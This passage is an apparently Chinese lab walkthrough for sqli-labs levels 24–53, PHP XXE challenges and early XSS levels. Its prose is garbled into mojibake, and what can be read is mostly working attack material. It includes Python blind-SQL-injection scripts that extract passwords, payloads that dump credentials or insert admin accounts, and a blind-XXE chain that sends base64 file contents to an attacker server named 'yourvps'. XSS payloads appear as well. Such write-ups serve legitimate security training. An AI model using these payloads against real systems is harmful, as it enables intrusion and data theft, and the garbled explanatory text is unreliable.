çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚ äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸¤æ­¥: ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚ ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚ æ­£å¸¸ç”¨æˆ·adminå¯ä»¥æ­£å¸¸ç™»å½•ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨å†Œä¸€ä¸ªéæ­£å¸¸çš„æ¶æ„ç”¨æˆ·ï¼Œå‘æ•°æ®åº“ä¸­æ’å…¥æ¶æ„æ•°æ®ï¼Œæ¥ä¿®ä¸ªæ­£å¸¸ç”¨æˆ·adminçš„å¯†ç  username: adminâ€™# password: ä»»æ„ æ³¨å†Œå®Œåå¯ä»¥ä½¿ç”¨è¯¥è´¦å·ç™»å½• ç™»å½•åå¯ä»¥æ›´æ”¹ç”¨æˆ·çš„å¯†ç ï¼Œæ­¤æ—¶å¯ä»¥éšæ„ä¿®æ”¹å¯†ç ï¼Œé‚£ä¹ˆadminç”¨æˆ·çš„å¯†ç å°±ä¼šè¢«æ”¹æˆæ”¹å¯†ç  çœ‹çœ‹æºç ï¼Œåˆ†æåŸç† $sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;); å°†ç”¨æˆ·åå’Œå¯†ç å¸¦å…¥ $sql = &quot;UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; #&#x27; and password=&#x27;$curr_pass&#x27; &quot;; å¯ä»¥çœ‹åˆ°çœŸæ­£çš„sqlè¯­å¥ä¸º $sql = &quot;UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; è¿™æ¨å°±å¯¼è‡´äº†adminç”¨æˆ·å¯†ç è¢«æ”¹å˜ã€‚ level25è¿™ä¸€å…³å°è¯•å¯ä»¥å‘ç°ï¼Œæ˜¯å°†orå’Œandæ›¿æ¢æˆç©º ä½†æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œå› ä¸ºå®ƒåªè¿‡æ»¤äº†ä¸€æ¬¡ æ‰€ä»¥è¿˜æ˜¯å¯ä»¥ä½¿ç”¨unionæ³¨å…¥ï¼Œå°±æ˜¯è¦æ³¨æ„orå’Œandå•è¯éœ€è¦åŒå†™ã€‚ level25aè¿™ä¸€å…³å’Œä¸Šä¸€å…³ä¸€æ ·æ˜¯è¿‡æ»¤äº†orå’Œandï¼Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œä½†æ˜¯éœ€è¦ä½¿ç”¨ç›²æ³¨ å¯ä»¥ä½¿ç”¨level8ä½¿ç”¨çš„è„šæœ¬ï¼Œå¯¹å…¶payloadç¨åŠ ä¿®æ”¹å³å¯ import requests url = &quot;http://127.0.0.1/sqli-labs/Less-25a/?id=&quot; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1 aandnd ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.foorrmat(i,mid) # payload = &quot;1 aandnd (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from infoorrmation_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) # payload = &quot;1 aandnd (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1 aandnd (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;Your Login name&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag) print(flag) level2626ä¸ä¸Šä¸€å…³ç›¸æ¯”ï¼Œå¾ˆç±»ä¼¼ï¼Œç©ºæ ¼ï¼Œæ³¨é‡Šç¬¦å’Œ / ä¹Ÿç»™è¿‡æ»¤äº† å¯¹äºæ³¨é‡Šå’Œç»“å°¾å­—ç¬¦çš„æˆ‘ä»¬æ­¤å¤„åªèƒ½åˆ©ç”¨æ„é€ ä¸€ä¸ª â€˜ æ¥é—­åˆåé¢åˆ° â€˜ ï¼›å¯¹äºç©ºæ ¼ï¼Œæœ‰è¾ƒå¤šçš„æ–¹æ³•ï¼š %09 TABé”®ï¼ˆæ°´å¹³ï¼‰ %0a æ–°å»ºä¸€è¡Œ %0c æ–°çš„ä¸€é¡µ %0d returnåŠŸèƒ½ %0b TABé”®ï¼ˆå‚ç›´ï¼‰ %a0 ç©ºæ ¼(åº”è¯¥æ˜¯phpè½¬åŒ–çš„æ—¶å€™æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œç„¶åmysqlä¼šè§£é‡Šä¸ºç©ºç™½å­—ç¬¦) å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…ç›²æ³¨ payload: 0&#x27;||left(database(),1)&gt;&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 0&#x27;||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||&#x27;1&#x27;=&#x27;1 level26aä¸ä¸Šä¸€å…³ä¸€æ ·ï¼Œé¢˜ç›®æç¤ºç©ºæ ¼ä¸æ³¨é‡Šè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨%a0ç»•è¿‡ï¼ŒæŠ¥é”™æ³¨å…¥ä¸å‡ºï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨ 0&#x27;||&#x27;1&#x27;=&#x27;1 #æ¢æµ‹ä¸º&#x27; 0&#x27;||left(database(),1)=&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 ç™½ç›’å®¡è®¡çŸ¥é“æ˜¯&#x27;) 0%27)%a0union%a0select%a01,database(),2||(&#x27;1 0%27)%a0union%a0select%a01,database(),2;%00 level27é¢˜ç›®æç¤ºunionä¸selectè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰ä½¿ç”¨preg_ireplace(),æ‰€ä»¥å¯ç”¨å¤§å°å†™ç»•è¿‡ 0&#x27;||&#x27;1&#x27;=&#x27;1 0&#x27;||left(database(),1)=&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 0&#x27;%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 level27aä¸27å…³åŸºæœ¬ä¸€æ ·ï¼Œå°±æ˜¯åœ¨idå‚æ•°ä½ç½®æ²¡æœ‰ä½¿ç”¨å•å¼•å·é—­åˆ payload: 0%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 level28union selectå¤§å°å†™å‡è¢«è¿‡æ»¤ï¼Œä½†æ˜¯selectè¿˜å¯å•ç‹¬ç”¨ï¼Œç›²æ³¨å³å¯ï¼Œæ³¨æ„è¿™é‡Œçš„idé—­åˆæ–¹å¼ä¸º(&#39;&#39;) 0&#x27;)||left(database(),1)&gt;&#x27;s&#x27;;%00 level28aä¸28å…³ç›¸æ¯”ï¼Œç®€å•å¾ˆå¤šï¼Œåªæ˜¯è¿‡æ»¤äº†union select,æ‰€ä»¥å¯ä»¥ç»§ç»­ä½¿ç”¨ä¸Šé¢çš„payload 0&#x27;)||left((database()),1)=&#x27;s&#x27;;%00 0&#x27;)||left((selEct%0agroup_concat(schema_name)%0afrom%0Ainformation_schema.schemata),1)&lt;&#x27;s&#x27;;%00 level29åˆ©ç”¨tomcatä¸apacheè§£æç›¸åŒè¯·æ±‚å‚æ•°ä¸åŒçš„ç‰¹æ€§ï¼Œtomcatè§£æç›¸åŒè¯·æ±‚å‚æ•°å–ç¬¬ä¸€ä¸ªï¼Œè€Œapacheå–ç¬¬äºŒä¸ªï¼Œå¦‚?id=1&amp;id=2ï¼Œtomcatå–å¾—1ï¼Œapacheå–å¾—2 ?id=1&amp;id=0&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level30ä¸ 29 æ¶æ„ä¸€æ ·ï¼ŒåŸç†ä¸€è‡´åªä¸è¿‡åŠ äº†&quot;é™åˆ¶ ?id=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level31æ¶æ„ä¸€æ ·ï¼Œå¤šäº†&quot;) ?id=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level32æ³¨æ„æ˜¯GBKï¼Œå¯ä»¥ç”¨%dfè¿›è¡Œå®½å­—èŠ‚æ³¨å…¥ å®½å­—èŠ‚æ³¨å…¥ å®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨äº†mysqlä¸€ä¸ªç‰¹æ€§ï¼Œå³å½“mysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ã€‚ï¼ˆå‰ä¸€ä¸ªASCIIç è¦å¤§äº128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ å…ˆäº†è§£ä¸€ä¸‹è¿™äº›å­—ç¬¦çš„urlç¼–ç ï¼š å½“è¾“å…¥å•å¼•å·ï¼Œç»addslashesè½¬ä¹‰åï¼Œå¯¹åº”çš„urlç¼–ç æ˜¯ï¼šâ€˜ â€“&gt; &#39; â€“&gt; %5C%27å½“åœ¨å‰é¢å¼•å…¥ä¸€ä¸ªASCIIå¤§äº128çš„å­—ç¬¦ï¼ˆæ¯”å¦‚%dfï¼‰ï¼Œurlç¼–ç å˜ä¸ºï¼š%df â€“&gt; %df \\ â€˜ â€“&gt; ï¼ˆ%df%5Cï¼‰%27 è‹¥ä½¿ç”¨gbkç¼–ç çš„è¯ï¼Œ%df%5Cä¼šè¢«å½“ä½œä¸€ä¸ªæ±‰å­—å¤„ç†ï¼Œä»è€Œä½¿%27ï¼ˆå•å¼•å·ï¼‰é€ƒå‡ºç”Ÿå¤©ï¼ŒæˆåŠŸç»•è¿‡ payload: 0%df%27%20or%201=1%23 0%df&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level33ä¸32ç›¸åŒ payload: 0%df&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level34è¿™å…³çš„è¿‡æ»¤æ–¹å¼å’Œå‰é¢ä¸€æ ·ï¼Œè€ƒè™‘å®½å­—èŠ‚æ³¨å…¥ï¼Œä½†æ˜¯POSTä¼ å…¥æ•°æ®æ—¶ä¸ä¼šè¿›è¡ŒURLç¼–ç ï¼Œå› æ­¤è¿™é‡Œé‡‡ç”¨å°†utf8å•å¼•å·è½¬ä¸ºutf-16/utf-32ç¼–ç ç»•è¿‡ï¼Œå³å°†&#39;è½¬ä¸ºutf-16ä¸º ï¿½&#39; payload: Username: 1ï¿½&#x27; or 1=1# Password: ä»»æ„ level35GETå‹å®½å­—èŠ‚æ³¨å…¥ï¼Œä½†åŒºåˆ«æ˜¯è¿™é‡Œæ˜¯æ•°å­—å‹ï¼Œä¸éœ€è¦ç”¨å•å¼•å·é—­åˆäº†ï¼Œå…¶ä»–çš„å’Œless-32ä¸€æ ·ï¼Œ16è¿›åˆ¶ç»•è¿‡ä¸€ä¸‹è¡¨åå³å¯ã€‚ payload: ?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+ level36ç›´æ¥ä½¿ç”¨32å…³çš„payload ?id=-1%df&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+ level37å’Œless-34ä¸€æ · payload: Username: 1ï¿½&#x27; or 1=1# Password: ä»»æ„ level38å †å æ³¨å…¥ï¼šå¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œç”¨åˆ†å·é—´éš” å †å æ³¨å…¥ä¼˜ç‚¹æ˜¯å¯ä»¥æ‰§è¡Œçš„è¯­å¥æ›´åŠ çµæ´»ï¼Œå¦‚Createã€Deleteã€Updateã€Insertã€Dropâ€¦.ï¼Œä½†ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œåœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ å¯ä»¥ä½¿ç”¨createåˆ›å»ºä¸€å¼ è¡¨ 1&#x27;;create table test like users;%23 ä¹Ÿå¯ä»¥å‘æ•°æ®åŒ…ä¸­æ’å…¥ä¸€æ¡æ•°æ® ?id=1&#x27;;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level39å’Œ38ä¸€æ ·ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯æ•°å­—å‹ï¼Œæ— éœ€é—­åˆã€‚ ?id=1;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level40é—­åˆæ–¹å¼ä¸åŒè€Œå·² payload ?id=1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level41æ•°å­—å‹æ³¨å…¥ä¸39å…³ç›¸åŒ ?id=1;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level42ä¸ä¹‹å‰å‡ å…³ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œçš„usernameä½ç½®è¿›è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦passwordä½ç½®è¿›è¡Œå †å æ³¨å…¥ payload Usernameï¼šusnn Passwordï¼š1&#x27;;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# ç‚¹å‡»ç™»å½•åï¼Œä¼šå‘ç°ç™»å½•å¤±è´¥ï¼Œä½†æ˜¯inertè¯­å¥å·²ç»è¢«æ‰§è¡Œäº†ï¼Œå¯ä»¥ä½¿ç”¨admin123è´¦å·ç›´æ¥ç™»å½• level43ä¸42çš„é—­åˆæ–¹å¼ä¸åŒ ä½¿ç”¨çš„æ˜¯(&#39;&#39;) payload Usernameï¼šusnn Passwordï¼š1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level44ä¸42ç›¸åŒ Usernameï¼šusnn Passwordï¼š1&#x27;;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level45ä¸43ç›¸åŒ Usernameï¼šusnn Passwordï¼š1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level46order byæ³¨å…¥ usernameã€passwordå‡ä¸ºåˆ—åï¼Œæ‰€ä»¥ä»¥ä¸‹éœ€è¦çŸ¥é“åˆ—å ?order=if(1=1,username,password) ?order=null,if(1=1,username,password) ?order=(case when (1=1) then username else password end) ?order=ifnull(null, username) ?order=rand(1=1) //order by rand(1)/rand(0)ä¸¤è€…è¿”å›ä¸ä¸€æ · ?order=(select 1 regexp if(1=1,1,0x00)) å°†1=1æ¢æˆboolç›²æ³¨çš„è¯­å¥å‡½æ•°å³å¯ç”¨äºè·å–æ•°æ®sort=rand(ascii(database(),1))=115) æ—¶é—´ç›²æ³¨ sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5)) sort=(select if(substring(current,1,1)=char(115),benchmatrk(5000000,md5(&#x27;1&#x27;)),null) from (select database() as current) as tb1) Bool ç›²æ³¨ rand(ascii(left(database()),1))=115) æŠ¥é”™æ³¨å…¥ï¼š updatexml(1,if(1=1,concat(0x7e,version()),2),1) (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) procedure analyse å‚æ•°åæ³¨å…¥ sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) into outfileå‚æ•°: id=1 into outfield &quot;path&quot; ä¸Šä¼ ç½‘é©¬ï¼Œå¯ä»¥åœ¨åé¢åŠ ä¸Šlines terminated by 16è¿›åˆ¶è½¬ç çš„æ•°æ® level47ä¸46çš„é—­åˆé˜²æ­¢ä¸ç”¨ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ ?sort=1&#x27; and extractvalue(1,concat(0x7e,( select concat_ws(&#x27;:&#x27;,username,password) from users limit 0,1),0x7e))--+ level48ä½¿ç”¨æ—¶é—´ç›²æ³¨ 1 and If(ascii(substr(database(),1,1))&gt;115,0,sleep (5))--+ sort=rand(ascii(left(database(),1))=115) import requests url = &#x27;http://127.0.0.1/Less-48/ payloads = &#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27; data = &#x27;&#x27; for i in range(50): for j in payloads: # payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; try: r = requests.get(url+payload, timeout=1) except Exception: data += j print(data) break level49ä¸47çš„é—­åˆæ–¹å¼ä¸åŒï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç›²æ³¨ 1&#x27; and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+ 1&#x27; and (If(ascii(substr((select username from users where id=1),1,1))=68,0,sleep(5)))--+ level50order byä¸å †å æ³¨å…¥ç»“åˆï¼Œæ•°å­—å‹ payload: ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level51ä¸50å…³ç›¸æ¯”å¢åŠ å•å¼•å·é—­åˆ ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level52ä¸50ç›¸åŒ ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level53å’Œ51ä¸€æ ·ï¼Œåªæ˜¯ä¸ä¼šå›æ˜¾é”™è¯¯ï¼Œå †å æ³¨å…¥æ–¹å¼ç›¸åŒã€‚ ?sort=1&#x27;;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ xxeæŒ‘æˆ˜githubåœ°å€ï¼šhttps://github.com/vulnspy/phpaudit-XXE/archive/master.zip å› ä¸ºç¯å¢ƒæ­å»ºæ¯”è¾ƒç®€å•å°±ç›´æ¥åœ¨windowsä¸Šè¿è¡Œäº† è¯»å–çš„æ–‡ä»¶ä¹Ÿéšä¹‹æ”¹å˜ï¼Œåœ¨Dç›˜ä¸­å»ºç«‹ä¸€ä¸ª1.txt DOMDocumentä½¿ç”¨å¦‚ä¸‹payloadè¯»å–æ–‡ä»¶ &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; æ¼æ´åŸå›  DOmDocumentç±» $dom = new DOMDocument(); libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($data, LIBXML_NOENT); ob_start(); var_dump($dom); $resp = ob_get_contents(); ob_end_clean(); &#125; SimpleXMLElementä½¿ç”¨payloadï¼š &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; æ¼æ´ä»£ç  é€ æˆ XXE çš„ç±»æ˜¯ SimpleXMLElement libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = new SimpleXMLElement($data, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125; simplexml_load_stringpayload: &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; é€ æˆæ¼æ´çš„æ˜¯simplexml_load_stringï¼Œä»£ç å¦‚ä¸‹ $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = simplexml_load_string($data, &#x27;SimpleXMLElement&#x27;, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125; BlindXXEè¿™ä¸€å…³æäº¤payloadæ— æ³•çœ‹åˆ°å†…å®¹ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æ˜¯è®¿é—®æˆåŠŸçš„ æ­£å¸¸æƒ…å†µä¸‹ï¼Œåªä¼šè¿”å›ç»™æˆ‘ä»¬okï¼Œå³æœ‰æŸ¥è¯¢ç»“æœï¼Œä½†æ˜¯ä¸ä¼šå‘Šè¯‰æˆ‘ä»¬ç»“æœæ˜¯ä»€ä¹ˆ æºç å¦‚ä¸‹ &lt;?php if(isset($_GET[&#x27;s&#x27;]))&#123; show_source(__FILE__); exit; &#125; libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = simplexml_load_string($data, &#x27;SimpleXMLElement&#x27;, LIBXML_NOENT); if($xml &amp;&amp; isset($xml-&gt;name))&#123; $name = $xml-&gt;name; &#125; echo isset($name)?&#x27;ok&#x27;:&#x27;error&#x27;; &#125; ?&gt; ä¸Šé¢çš„ä¾‹å­æ˜¯å› ä¸ºecho htmlspecialchars($resp);è¿™å¥ä»£ç æ‰€ä»¥æ‰æœ‰å›æ˜¾ï¼Œé‚£ä¹ˆæŠŠè¿™æ®µä»£ç å»æ‰ï¼Œå°±å˜æˆäº†æ— å›æ˜¾ã€‚é‚£ä¹ˆï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½è¿›è¡Œxxeäº†å‘¢ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œè™½ç„¶é¶æœºæ²¡æœ‰è¿”å›ç»™æˆ‘ä»¬æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®å¸¦åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šã€‚ æˆ‘ä»¬ä¼ å…¥å¦‚ä¸‹çš„payloadï¼š &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=D:/1.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://yourvps/evil.xml&quot;&gt; %dtd; %send; ]&gt; &lt;abc&gt;&lt;/abc&gt; ç„¶ååœ¨è‡ªå·±çš„vpsä¸Šçš„evil.xmlå†™å…¥ï¼š &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://yourvps/?content=%file;&#x27;&gt;&quot;&gt; %payload; æ³¨æ„ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å‚æ•°å®ä½“payloadæ¥åµŒå¥—å®šä¹‰å‚æ•°å®ä½“sendï¼Œæ‰€ä»¥è¢«åµŒå¥—å®šä¹‰çš„å‚æ•°å®ä½“%ä¸€å®šè¦HTMLç¼–ç ä¸ºï¼š% å¦‚æ­¤ä¸€æ¥ï¼Œè°ƒç”¨çš„è¿‡ç¨‹å°±å˜æˆäº†ï¼šå‚æ•°å®ä½“dtdé€šè¿‡httpåè®®æ¥è®¿é—®vpsä¸Šçš„evil.xmlï¼Œç„¶åè¿”å›evil.xmlçš„å†…å®¹ï¼Œè°ƒç”¨äº†å‚æ•°å®ä½“payloadï¼Œç„¶åpayloadåˆè°ƒç”¨äº†å‚æ•°å®ä½“sendï¼Œsendçš„ä½œç”¨å°±æ˜¯æŠŠå‚æ•°å®ä½“fileï¼ˆå³æ–‡ä»¶D:/1.txtçš„base64ç¼–ç å†…å®¹ï¼‰å‘é€åˆ°æˆ‘ä»¬çš„vpsä¸Šï¼Œæ³¨æ„åœ¨æœåŠ¡å™¨ä¸Šç›‘å¬ xssé€šå…³å› ä¸ºç½‘ä¸Šæœ‰æŒ‘æˆ˜é¢˜ç›®çš„ç½‘å€å°±æ²¡åœ¨æœ¬åœ°æ­å»º 1æœ€åŸºç¡€çš„xssï¼Œgetæäº¤ ?name=&lt;script&gt;alert(1)&lt;/script&gt; 2ç¬¬äºŒå…³ç›´æ¥æäº¤ä¼šå‘ç°æ²¡æœ‰å¼¹çª— æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸º&lt;script&gt;ï¼Œè¢«åŒ…è£¹åœ¨inputæ ‡ç­¾ä¸­æ— æ³•èµ·ä½œç”¨ï¼Œå› æ­¤éœ€è¦å…ˆé—­åˆinputæ ‡ç­¾ payload &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 3ç›´æ¥æäº¤æŸ¥çœ‹æºç  å¯ä»¥å‘ç°æäº¤åçš„æ•°æ®ç»è¿‡htmlspecialchars()è½¬åŒ–æˆäº†å®ä½“å˜é‡ä¸åœ¨æœ‰jsä»£ç çš„ä½œç”¨ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ç§æ–¹æ³• payload &#39;onclick&#x3D;&#39;javascript:alert(1)&#39; å†ç‚¹å‡»ä¸€æ¬¡å°±å¯ä»¥è¿‡å…³ 4è¿™é¢˜ä¸ä¸Šé¢çš„ä¸€æ ·åªä¸è¿‡è¿™æ¬¡æ¢æˆäº†åŒå¼•å·é—­åˆ &quot;onclick=&#x27;javascript:alert(1)&#x27; 5æäº¤&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; å¯ä»¥å‘ç°scriptè¢«æ¢æˆäº†scr_iptï¼Œä½¿ç”¨&quot;onclick=&#39;javascript:alert(1)&#39;ä¹Ÿä¸è¡Œ å†æ¢ä¸€ç§æ–¹æ³• 6å°è¯•äº† &lt;input name=keyword value=&quot; &quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;&quot;&gt; &lt;input name=keyword value=&quot; &quot;o_nclick=&#x27;javascript:alert(1)&#x27; &quot;&gt; &lt;input name=keyword value=&quot; 